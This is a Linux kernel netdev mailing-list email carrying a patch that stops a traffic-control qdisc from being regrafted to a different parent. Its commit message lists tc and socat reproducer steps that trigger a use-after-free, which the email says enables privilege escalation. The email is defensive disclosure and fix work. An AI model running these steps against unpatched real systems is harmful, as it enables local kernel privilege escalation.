Return-Path: <netdev+bounces-156709-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 25691A0790F
	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 15:22:10 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id BE84F1882D35
	for <lists+netdev@lfdr.de>; Thu,  9 Jan 2025 14:22:12 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id A1E3421A428;
	Thu,  9 Jan 2025 14:21:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="2yQswHZr"
X-Original-To: netdev@vger.kernel.org
Received: from mail-qv1-f48.google.com (mail-qv1-f48.google.com [209.85.219.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 74862290F
	for <netdev@vger.kernel.org>; Thu,  9 Jan 2025 14:21:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1736432518; cv=none; b=DHPWQFOACOqONiir9QNWmkTg7qNLFYq2Mwf44DNW3MB+KJZaOqSMJ68iII/7GgP0oA3WRc4SNh+QBuJqupwGFKqdrVhCTykjpr0YOihGjwl7pyO/NQStDMqxRlBcnKmgTLlnEJEMTTY41kDR//uymjVmjh4n4nQPrbIE4Oz5X50=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1736432518; c=relaxed/simple;
	bh=1UjWelzK9ldPeBVoIR+ZG4VTv9xbDkpVFFxmbxBetJY=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=Ml3HFoLRjFGqdFdEkAFFULwJnJ/VUkkPgpQjv0ik7r4uhNJGVg/XrZxmxk/67UeufQ7RD0o4K4zu5Vm+L5C8yjh6PVsZ9FQh8Qqsgl0I09dSOjpztNLFUh5KrbfhBBhLtLxXVZvS4DjqFB0ka7YND52IiHsjXd3SXHO7y2mOHQ0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=2yQswHZr; arc=none smtp.client-ip=209.85.219.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Received: by mail-qv1-f48.google.com with SMTP id 6a1803df08f44-6dcc42b5e30so11194336d6.1
        for <netdev@vger.kernel.org>; Thu, 09 Jan 2025 06:21:56 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1736432515; x=1737037315; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=i3V9sPefjb+hwddJZRGj0VSg2JfdeejyXhsqvhZ8HSY=;
        b=2yQswHZr3Skm7cW6vcds/+VGm5hPgRMeOIy6orX3JDDuVXMYdK0iLyRHKazY05hIlq
         73MlOvGn03lndfs/9cYDgJe0Km+dAWYQn1GD70SaRqobPVimTbcgy/nPN0I+iWEhDji0
         fsWDzpmC5/8R8tNkkkzCSUWvB1I77Sxya34HexVhe7ka4Giz23R6fihkkai6f/Y9SDCc
         7SFZVc6Tqv/T9s+xLfDW8qmv+sC0ePztgZuCQQ7NPKUONdDLNdeqW0kGwTH0Mc5bJgZS
         Pg0ZGrmAkFye4EpNOZArjzE+Z0D5+G3gEUwAY2JfP5xVjUou+NaewNexQJ/p+DSRYg8g
         NfUg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1736432515; x=1737037315;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=i3V9sPefjb+hwddJZRGj0VSg2JfdeejyXhsqvhZ8HSY=;
        b=aNabZfQOdOwnypuZILt58BVpq5Pm/BQhS5gJK41GYyjjbf+rGyjMnV5Vs9m5Oej3Sk
         g/WqYzWosn+C1OF67gQw02WZ3ub0Dc+yJR2wOWhE51X26T9ogao0+8uyLTG5iYmbFcTi
         RMRXqWPC/Yh/8R1l4KAAzRN3EFJph1PLInmHNzqx2xJu+5e0q/gSG2GhweVkyTrGtzRZ
         EwY4ZgKzRE0p2WrYEDFiPxXxl012+2vbjjTf7gDoXv5on+4keMq/zrA4xEk8TGrcD1T8
         Y2msAvHiaIC4jAYy2UXmO3YaWFaBWssQSAhEHhjJBymwRZqxiHrjBHPvcZz6ball7eiA
         IQjA==
X-Gm-Message-State: AOJu0YyEWSQr/Z1CjUPTAhu8k8b9klDb25l3nJooj6C2kQkY/hkqld1b
	uNKM+t2oHPb6t+5SNWpU3/TsE1kKg1rIP41MRywAaTvsmEBZFyyrTpK+N2G15tESbyN2bNPANJY
	=
X-Gm-Gg: ASbGncstnNXEaqlfFZAtH2tDQv6Kp2mPiMCoGw5HLmGediW+uJPooYUjbSPAfoiRW8x
	X+b+nuj3q2XaCep/tUM9CaBO01WJixvWTC9t1uo67R+7YfEO0XYRNr9Ut6XbqH93PnYHfFfxRF2
	xA3MLNVg/aDp+CxFO90wvHWCA28OjsttziknvfF3eNr8Z7LgOaJ/hyUOiE3Xk457dHvRFZRhegG
	FKRE/m6npGpJYjypLWgz6HkUgWoPIayX+3rKTvazcfcOAfN
X-Google-Smtp-Source: AGHT+IEorflohHFJSutQCmhLNUfVJ7COjkmK9POTBJAV/IVa2EBwjpMMrLuV428NEyg6/uQHET1vTQ==
X-Received: by 2002:a05:6214:3289:b0:6d8:ab3c:5e8 with SMTP id 6a1803df08f44-6df9b2b31c2mr114048526d6.29.1736432514899;
        Thu, 09 Jan 2025 06:21:54 -0800 (PST)
Received: from majuu.waya ([76.64.65.230])
        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-6dd180ea82fsm201328966d6.26.2025.01.09.06.21.53
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 09 Jan 2025 06:21:54 -0800 (PST)
From: Jamal Hadi Salim <jhs@mojatatu.com>
To: netdev@vger.kernel.org
Cc: jiri@resnulli.us,
	xiyou.wangcong@gmail.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	nnamrec@gmail.com
Subject: [PATCH net 1/1] net: sched: Disallow replacing of child qdisc from one parent to another
Date: Thu,  9 Jan 2025 09:21:43 -0500
Message-Id: <20250109142143.26084-1-jhs@mojatatu.com>
X-Mailer: git-send-email 2.34.1
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".

Joint work with Lion Ackermann <nnamrec@gmail.com>

Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
---
 net/sched/sch_api.c | 8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)

diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
index 300430b8c4d2..e162a1b31173 100644
--- a/net/sched/sch_api.c
+++ b/net/sched/sch_api.c
@@ -1612,7 +1612,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 	struct nlattr *tca[TCA_MAX + 1];
 	struct net_device *dev;
 	u32 clid;
-	struct Qdisc *q, *p;
+	struct Qdisc *leaf_q, *q, *p;
 	int err;
 
 replay:
@@ -1640,6 +1640,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					return -ENOENT;
 				}
 				q = qdisc_leaf(p, clid);
+				leaf_q = q;
 			} else if (dev_ingress_queue_create(dev)) {
 				q = rtnl_dereference(dev_ingress_queue(dev)->qdisc_sleeping);
 			}
@@ -1673,6 +1674,11 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					NL_SET_ERR_MSG(extack, "Invalid qdisc name");
 					return -EINVAL;
 				}
+				if (leaf_q && leaf_q->parent != q->parent) {
+					NL_SET_ERR_MSG(extack, "Invalid Parent for operation");
+					return -EINVAL;
+				}
+
 				if (q->flags & TCQ_F_INGRESS) {
 					NL_SET_ERR_MSG(extack,
 						       "Cannot regraft ingress or clsact Qdiscs");
-- 
2.34.1


